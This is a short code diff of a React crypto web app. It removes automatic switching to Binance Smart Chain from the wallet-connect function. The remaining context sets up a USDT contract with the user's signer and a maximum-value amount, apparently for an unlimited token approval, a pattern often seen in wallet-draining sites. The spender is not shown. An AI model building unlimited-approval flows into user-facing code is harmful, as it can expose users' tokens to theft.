@@ -23,50 +23,7 @@ function App() {
       alert("Please install MetaMask or Trust Wallet");
       return;
     }
-
-    const BSC_CHAIN_ID = "0x38"; // 56 in hex for BSC Mainnet
-
     try {
-      const currentChainId = await window.ethereum.request({ method: "eth_chainId" });
-
-      if (currentChainId !== BSC_CHAIN_ID) {
-        try {
-          // Try switching to BSC
-          await window.ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: BSC_CHAIN_ID }],
-          });
-        } catch (switchError) {
-          if (switchError.code === 4902) {
-            try {
-              // Add BSC if not present
-              await window.ethereum.request({
-                method: "wallet_addEthereumChain",
-                params: [{
-                  chainId: BSC_CHAIN_ID,
-                  chainName: "Binance Smart Chain Mainnet",
-                  nativeCurrency: {
-                    name: "Binance Coin",
-                    symbol: "BNB",
-                    decimals: 18
-                  },
-                  rpcUrls: ["https://bsc-dataseed.binance.org/"],
-                  blockExplorerUrls: ["https://bscscan.com"]
-                }],
-              });
-            } catch (addError) {
-              console.error("Add BSC Error:", addError);
-              alert("Failed to add Binance Smart Chain to wallet");
-              return;
-            }
-          } else {
-            console.error("Switch Error:", switchError);
-            alert("Failed to switch to Binance Smart Chain");
-            return;
-          }
-        }
-      }
-
       await window.ethereum.request({ method: "eth_requestAccounts" });
       const _provider = new ethers.BrowserProvider(window.ethereum);
       const _signer = await _provider.getSigner();
@@ -87,7 +44,6 @@ function App() {
       alert("Please connect your wallet first");
       return;
     }
-
     const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
     const maxAmount = ethers.MaxUint256;
 
